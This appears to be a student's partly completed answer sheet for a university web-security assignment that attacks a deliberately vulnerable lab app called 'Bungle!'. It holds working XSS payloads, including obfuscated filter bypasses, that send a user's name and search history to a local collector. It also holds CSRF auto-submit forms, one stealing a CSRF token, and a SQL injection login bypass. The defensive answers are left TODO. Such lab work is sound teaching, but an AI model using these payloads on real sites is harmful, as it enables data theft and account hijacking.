COSC 480B Assignment #3: Web Security

Due Date: 11/9/20 at 5:00pm ET

You may work with a partner on this assignment. 
Only one person partnership needs to submit.

Reminder: You may NOT work with the same partner on multiple assignments. 


NAMES: [Full Names of both partners]

________________________________________________________________________________________

Part 1: Cross-site Scripting (XSS)

	1.0) Payload (JavaScript/jQuery):

		<script>
		        window.addEventListener('DOMContentLoaded',
            function (){
            var USERNAME = document.getElementById("logged-in-user").innerText;
            var LAST_SEARCH = document.getElementsByClassName("history-item list-group-item")[1].innerText;
            $.get("http://localhost:31337/stolen?user=USERNAME%26last_search=LAST_SEARCH",{'info[]' : [USERNAME, LAST_SEARCH]})%3B    
            });
		</script>

	1.0) No defense

    http://127.0.0.5:8080/search?xssdefense=0&q=<script>
        window.addEventListener('DOMContentLoaded',
        function (){
        var USERNAME = document.getElementById("logged-in-user").innerText%3B
        var LAST_SEARCH = document.getElementsByClassName("history-item list-group-item")[1].innerText%3B
        $.get("http://localhost:31337/stolen?user=USERNAME%26last_search=LAST_SEARCH",{'info[]' : [USERNAME, LAST_SEARCH]})%3B    
        })%3B
    </script>
    
	1.1) Remove "script"
 
    http://127.0.0.5:8080/search?xssdefense=1&q=
    <img src="e" onerror="
            $.get('http://localhost:31337/stolen?user=USERNAME%26last_search=LAST_SEARCH', 
            {   'info[]' : [(document.getElementById('logged-in-user').innerText),(document.getElementsByClassName('history-item list-group-item')[1].innerText)]
            }) 
    ">
    </img>  


	1.2) Remove several tags 

		http://127.0.0.5:8080/search?xssdefense=2&q=<a onmouseover="$.get('http://localhost:31337/stolen?user=USERNAME%26last_search=LAST_SEARCH', 
        {   'info[]' : [(document.getElementById('logged-in-user').innerText),(document.getElementsByClassName('history-item list-group-item')[1].innerText)]
        }) "\>xxs link\</a\>
    


	1.3) Remove " ' and ;

        http://127.0.0.5:8080/search?xssdefense=3&q=<script>eval(String.fromCharCode(32,119,105,110,100,111,119,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,68,79,77,67,111,110,116,101,110,116,76,111,97,100,101,100,39,44,10,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,40,41,123,10,32,32,32,32,32,32,32,32,118,97,114,32,85,83,69,82,78,65,77,69,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,108,111,103,103,101,100,45,105,110,45,117,115,101,114,34,41,46,105,110,110,101,114,84,101,120,116,59,10,32,32,32,32,32,32,32,32,118,97,114,32,76,65,83,84,95,83,69,65,82,67,72,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,67,108,97,115,115,78,97,109,101,40,34,104,105,115,116,111,114,121,45,105,116,101,109,32,108,105,115,116,45,103,114,111,117,112,45,105,116,101,109,34,41,91,49,93,46,105,110,110,101,114,84,101,120,116,59,10,32,32,32,32,32,32,32,32,36,46,103,101,116,40,34,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,51,49,51,51,55,47,115,116,111,108,101,110,63,117,115,101,114,61,85,83,69,82,78,65,77,69,38,108,97,115,116,95,115,101,97,114,99,104,61,76,65,83,84,95,83,69,65,82,67,72,34,44,123,39,105,110,102,111,91,93,39,32,58,32,91,85,83,69,82,78,65,77,69,44,32,76,65,83,84,95,83,69,65,82,67,72,93,125,41,59,32,32,10,32,32,32,32,32,32,32,32,125,41,59))</script>

	1.4) [Optional extra credit] Encode < and >

		http://0.0.0.0:8080/search?xssdefense=4&q=TODO


________________________________________________________________________________________

Part 2: Cross-site Request Forgery (CSRF)

	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4

    <html>
        <body>
            <form action="http://127.0.0.5:8080/login?csrfdefense=0&xssdefense=4" method = "POST">
                <input id="username" name = "username" value="attacker">
                <input id="userpass" name = "password" value="URpwn3d">
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>


	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0

		<html>
            <script type ='text/javascript'>
            document.addEventListener("DOMContentLoaded", function(){url = "http://127.0.0.5:8080/search?q=%3Cscript%3E+document.addEventListener%28%22DOMContentLoaded%22%2C+function+%28%29%7B+var+token+%3D+Cookies.get%28%22csrf_token%22%29%3B+%24.post%28%22http%3A%2F%2F127.0.0.5%3A8080%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0+%22%2C+%7Busername%3A+%22attacker%22%2C+password%3A+%22URpwn3d%22%2C+csrf_token%3A+token%7D%29%3B%7D%29%3B+%3C%2Fscript%3E";
            window.location.href=url; },false);
            </script>
            <meta http-equiv="refresh" content="1">
            <body>
            </body>
		</html>


	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4

		<html>
			TODO
		</html>


________________________________________________________________________________________


Part 3: SQL Injection

	Username: victim
	Password: 'or 0=0--


________________________________________________________________________________________


Part 4: Better Defenses


	4.1) Briefly describe how you implemented password salting and hashing 

		TODO
		

	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks

		TODO


	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent XSS attacks

		TODO


	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent CSRF attacks

	     	TODO


________________________________________________________________________________________


Additional Questions

	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)

		[Your answer here]


	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?

		[Your answer here]


	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?

		[Your answer here]